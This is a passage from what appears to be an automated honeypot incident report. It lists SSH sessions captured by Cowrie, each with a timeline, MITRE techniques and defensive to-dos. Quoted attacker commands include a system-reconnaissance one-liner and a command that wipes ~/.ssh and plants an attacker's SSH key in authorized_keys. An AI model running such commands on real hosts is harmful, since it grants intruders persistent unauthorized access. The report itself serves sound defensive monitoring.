| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:19:45` | `cowrie.session.connect` |
| `2026-07-08 17:19:46` | `cowrie.client.version` |
| `2026-07-08 17:19:46` | `cowrie.client.kex` |
| `2026-07-08 17:19:47` | `cowrie.login.success` |
| `2026-07-08 17:19:48` | `cowrie.session.params` |
| `2026-07-08 17:19:48` | `cowrie.command.input` |
| `2026-07-08 17:19:48` | `cowrie.command.input` |
| `2026-07-08 17:19:48` | `cowrie.command.input` |
| `2026-07-08 17:19:48` | `cowrie.command.input` |
| `2026-07-08 17:19:48` | `cowrie.command.input` |
| `2026-07-08 17:19:48` | `cowrie.command.success` |
| `2026-07-08 17:19:48` | `cowrie.command.input` |
| `2026-07-08 17:19:48` | `cowrie.command.input` |
| `2026-07-08 17:19:48` | `cowrie.command.input` |
| `2026-07-08 17:19:48` | `cowrie.command.input` |
| `2026-07-08 17:19:49` | `cowrie.log.closed` |
| `2026-07-08 17:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83b24b7cdc2f

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-07-08 17:21 |
| **Last Seen** | 2026-07-08 17:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:21:54` | `cowrie.session.connect` |
| `2026-07-08 17:21:54` | `cowrie.client.version` |
| `2026-07-08 17:21:54` | `cowrie.client.kex` |
| `2026-07-08 17:21:55` | `cowrie.login.success` |
| `2026-07-08 17:21:56` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:22:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-875ea1d1250a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:22 |
| **Last Seen** | 2026-07-08 17:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:22:11` | `cowrie.session.connect` |
| `2026-07-08 17:22:11` | `cowrie.client.version` |
| `2026-07-08 17:22:11` | `cowrie.client.kex` |
| `2026-07-08 17:22:13` | `cowrie.login.success` |
| `2026-07-08 17:22:14` | `cowrie.session.params` |
| `2026-07-08 17:22:14` | `cowrie.command.input` |
| `2026-07-08 17:22:14` | `cowrie.command.input` |
| `2026-07-08 17:22:14` | `cowrie.command.input` |
| `2026-07-08 17:22:14` | `cowrie.command.input` |
| `2026-07-08 17:22:14` | `cowrie.command.input` |
| `2026-07-08 17:22:14` | `cowrie.command.success` |
| `2026-07-08 17:22:14` | `cowrie.command.input` |
| `2026-07-08 17:22:14` | `cowrie.command.input` |
| `2026-07-08 17:22:14` | `cowrie.command.input` |
| `2026-07-08 17:22:14` | `cowrie.command.input` |
| `2026-07-08 17:22:15` | `cowrie.log.closed` |
| `2026-07-08 17:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d572a687e0a5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 17:22 |
| **Last Seen** | 2026-07-08 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:22:19` | `cowrie.session.connect` |
| `2026-07-08 17:22:19` | `cowrie.client.version` |
| `2026-07-08 17:22:19` | `cowrie.client.kex` |
| `2026-07-08 17:22:19` | `cowrie.login.success` |
| `2026-07-08 17:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8814f5a80efa

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 17:22 |
| **Last Seen** | 2026-07-08 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:22:19` | `cowrie.session.connect` |
| `2026-07-08 17:22:19` | `cowrie.client.version` |
| `2026-07-08 17:22:19` | `cowrie.client.kex` |
| `2026-07-08 17:22:20` | `cowrie.login.success` |
| `2026-07-08 17:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12465a4a3743

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 17:22 |
| **Last Seen** | 2026-07-08 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:22:29` | `cowrie.session.connect` |
| `2026-07-08 17:22:29` | `cowrie.client.version` |
| `2026-07-08 17:22:29` | `cowrie.client.kex` |
| `2026-07-08 17:22:29` | `cowrie.login.success` |
| `2026-07-08 17:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f390b7f149c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 17:22 |
| **Last Seen** | 2026-07-08 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:22:29` | `cowrie.session.connect` |
| `2026-07-08 17:22:29` | `cowrie.client.version` |
| `2026-07-08 17:22:29` | `cowrie.client.kex` |
| `2026-07-08 17:22:29` | `cowrie.login.success` |
| `2026-07-08 17:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ead2c2192dc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 17:23 |
| **Last Seen** | 2026-07-08 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:23:08` | `cowrie.session.connect` |
| `2026-07-08 17:23:08` | `cowrie.client.version` |
| `2026-07-08 17:23:08` | `cowrie.client.kex` |
| `2026-07-08 17:23:08` | `cowrie.login.success` |
| `2026-07-08 17:23:09` | `cowrie.session.params` |
| `2026-07-08 17:23:09` | `cowrie.command.input` |
| `2026-07-08 17:23:09` | `cowrie.log.closed` |
| `2026-07-08 17:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b40f484de97

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:24 |
| **Last Seen** | 2026-07-08 17:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:24:33` | `cowrie.session.connect` |
| `2026-07-08 17:24:33` | `cowrie.client.version` |
| `2026-07-08 17:24:33` | `cowrie.client.kex` |
| `2026-07-08 17:24:35` | `cowrie.login.success` |
| `2026-07-08 17:24:36` | `cowrie.session.params` |
| `2026-07-08 17:24:36` | `cowrie.command.input` |
| `2026-07-08 17:24:36` | `cowrie.command.input` |
| `2026-07-08 17:24:36` | `cowrie.command.input` |
| `2026-07-08 17:24:36` | `cowrie.command.input` |
| `2026-07-08 17:24:36` | `cowrie.command.input` |
| `2026-07-08 17:24:36` | `cowrie.command.success` |
| `2026-07-08 17:24:36` | `cowrie.command.input` |
| `2026-07-08 17:24:36` | `cowrie.command.input` |
| `2026-07-08 17:24:36` | `cowrie.command.input` |
| `2026-07-08 17:24:36` | `cowrie.command.input` |
| `2026-07-08 17:24:37` | `cowrie.log.closed` |
| `2026-07-08 17:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab86f935e946

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 17:25 |
| **Last Seen** | 2026-07-08 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:25:45` | `cowrie.session.connect` |
| `2026-07-08 17:25:45` | `cowrie.client.version` |
| `2026-07-08 17:25:45` | `cowrie.client.kex` |
| `2026-07-08 17:25:45` | `cowrie.login.success` |
| `2026-07-08 17:25:46` | `cowrie.session.params` |
| `2026-07-08 17:25:46` | `cowrie.command.input` |
| `2026-07-08 17:25:46` | `cowrie.log.closed` |
| `2026-07-08 17:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef9512570785

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:26 |
| **Last Seen** | 2026-07-08 17:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:26:54` | `cowrie.session.connect` |
| `2026-07-08 17:26:54` | `cowrie.client.version` |
| `2026-07-08 17:26:54` | `cowrie.client.kex` |
| `2026-07-08 17:26:56` | `cowrie.login.success` |
| `2026-07-08 17:26:57` | `cowrie.session.params` |
| `2026-07-08 17:26:57` | `cowrie.command.input` |
| `2026-07-08 17:26:57` | `cowrie.command.input` |
| `2026-07-08 17:26:57` | `cowrie.command.input` |
| `2026-07-08 17:26:57` | `cowrie.command.input` |
| `2026-07-08 17:26:57` | `cowrie.command.input` |
| `2026-07-08 17:26:57` | `cowrie.command.success` |
| `2026-07-08 17:26:57` | `cowrie.command.input` |
| `2026-07-08 17:26:57` | `cowrie.command.input` |
| `2026-07-08 17:26:57` | `cowrie.command.input` |
| `2026-07-08 17:26:57` | `cowrie.command.input` |
| `2026-07-08 17:26:58` | `cowrie.log.closed` |
| `2026-07-08 17:26:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f29c1e1f85c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:29 |
| **Last Seen** | 2026-07-08 17:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:29:12` | `cowrie.session.connect` |
| `2026-07-08 17:29:12` | `cowrie.client.version` |
| `2026-07-08 17:29:12` | `cowrie.client.kex` |
| `2026-07-08 17:29:13` | `cowrie.login.success` |
| `2026-07-08 17:29:14` | `cowrie.session.params` |
| `2026-07-08 17:29:14` | `cowrie.command.input` |
| `2026-07-08 17:29:14` | `cowrie.command.input` |
| `2026-07-08 17:29:14` | `cowrie.command.input` |
| `2026-07-08 17:29:14` | `cowrie.command.input` |
| `2026-07-08 17:29:14` | `cowrie.command.input` |
| `2026-07-08 17:29:14` | `cowrie.command.success` |
| `2026-07-08 17:29:14` | `cowrie.command.input` |
| `2026-07-08 17:29:14` | `cowrie.command.input` |
| `2026-07-08 17:29:14` | `cowrie.command.input` |
| `2026-07-08 17:29:14` | `cowrie.command.input` |
| `2026-07-08 17:29:15` | `cowrie.log.closed` |
| `2026-07-08 17:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0021bebe4339

| Field | Detail |
|---|---|
| **Source IP** | `103.187.146[.]90` |
| **First Seen** | 2026-07-08 17:30 |
| **Last Seen** | 2026-07-08 17:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:30:55` | `cowrie.session.connect` |
| `2026-07-08 17:30:55` | `cowrie.client.version` |
| `2026-07-08 17:30:56` | `cowrie.client.kex` |
| `2026-07-08 17:30:57` | `cowrie.login.success` |
| `2026-07-08 17:30:58` | `cowrie.session.params` |
| `2026-07-08 17:30:58` | `cowrie.command.input` |
| `2026-07-08 17:30:58` | `cowrie.command.failed` |
| `2026-07-08 17:30:58` | `cowrie.log.closed` |
| `2026-07-08 17:30:59` | `cowrie.session.params` |
| `2026-07-08 17:30:59` | `cowrie.command.input` |
| `2026-07-08 17:30:59` | `cowrie.session.file_download` |
| `2026-07-08 17:30:59` | `cowrie.log.closed` |
| `2026-07-08 17:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.146[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.187.146[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ced21f88f0

| Field | Detail |
|---|---|
| **Source IP** | `103.187.146[.]90` |
| **First Seen** | 2026-07-08 17:31 |
| **Last Seen** | 2026-07-08 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:31:00` | `cowrie.session.connect` |
| `2026-07-08 17:31:00` | `cowrie.client.version` |
| `2026-07-08 17:31:00` | `cowrie.client.kex` |
| `2026-07-08 17:31:01` | `cowrie.login.success` |
| `2026-07-08 17:31:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.146[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.187.146[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2318d4a1ccd9

| Field | Detail |
|---|---|
| **Source IP** | `103.187.146[.]90` |
| **First Seen** | 2026-07-08 17:31 |
| **Last Seen** | 2026-07-08 17:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:31:01` | `cowrie.session.connect` |
| `2026-07-08 17:31:01` | `cowrie.client.version` |
| `2026-07-08 17:31:02` | `cowrie.client.kex` |
| `2026-07-08 17:31:03` | `cowrie.login.success` |
| `2026-07-08 17:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.146[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.187.146[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3ab243e3ff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:31 |
| **Last Seen** | 2026-07-08 17:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:31:27` | `cowrie.session.connect` |
| `2026-07-08 17:31:27` | `cowrie.client.version` |
| `2026-07-08 17:31:27` | `cowrie.client.kex` |
| `2026-07-08 17:31:29` | `cowrie.login.success` |
| `2026-07-08 17:31:30` | `cowrie.session.params` |
| `2026-07-08 17:31:30` | `cowrie.command.input` |
| `2026-07-08 17:31:30` | `cowrie.command.input` |
| `2026-07-08 17:31:30` | `cowrie.command.input` |
| `2026-07-08 17:31:30` | `cowrie.command.input` |
| `2026-07-08 17:31:30` | `cowrie.command.input` |
| `2026-07-08 17:31:30` | `cowrie.command.success` |
| `2026-07-08 17:31:30` | `cowrie.command.input` |
| `2026-07-08 17:31:30` | `cowrie.command.input` |
| `2026-07-08 17:31:30` | `cowrie.command.input` |
| `2026-07-08 17:31:30` | `cowrie.command.input` |
| `2026-07-08 17:31:30` | `cowrie.log.closed` |
| `2026-07-08 17:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ba60ce195f4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 17:32 |
| **Last Seen** | 2026-07-08 17:32 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:32:04` | `cowrie.session.connect` |
| `2026-07-08 17:32:05` | `cowrie.client.version` |
| `2026-07-08 17:32:05` | `cowrie.client.kex` |
| `2026-07-08 17:32:10` | `cowrie.login.success` |
| `2026-07-08 17:32:13` | `cowrie.session.params` |
| `2026-07-08 17:32:13` | `cowrie.command.input` |
| `2026-07-08 17:32:16` | `cowrie.log.closed` |
| `2026-07-08 17:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7bad49bc2ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:33 |
| **Last Seen** | 2026-07-08 17:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:33:42` | `cowrie.session.connect` |
| `2026-07-08 17:33:42` | `cowrie.client.version` |
| `2026-07-08 17:33:42` | `cowrie.client.kex` |
| `2026-07-08 17:33:43` | `cowrie.login.success` |
| `2026-07-08 17:33:45` | `cowrie.session.params` |
| `2026-07-08 17:33:45` | `cowrie.command.input` |
| `2026-07-08 17:33:45` | `cowrie.command.input` |
| `2026-07-08 17:33:45` | `cowrie.command.input` |
| `2026-07-08 17:33:45` | `cowrie.command.input` |
| `2026-07-08 17:33:45` | `cowrie.command.input` |
| `2026-07-08 17:33:45` | `cowrie.command.success` |
| `2026-07-08 17:33:45` | `cowrie.command.input` |
| `2026-07-08 17:33:45` | `cowrie.command.input` |
| `2026-07-08 17:33:45` | `cowrie.command.input` |
| `2026-07-08 17:33:45` | `cowrie.command.input` |
| `2026-07-08 17:33:45` | `cowrie.log.closed` |
| `2026-07-08 17:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2766353b058e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:36 |
| **Last Seen** | 2026-07-08 17:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
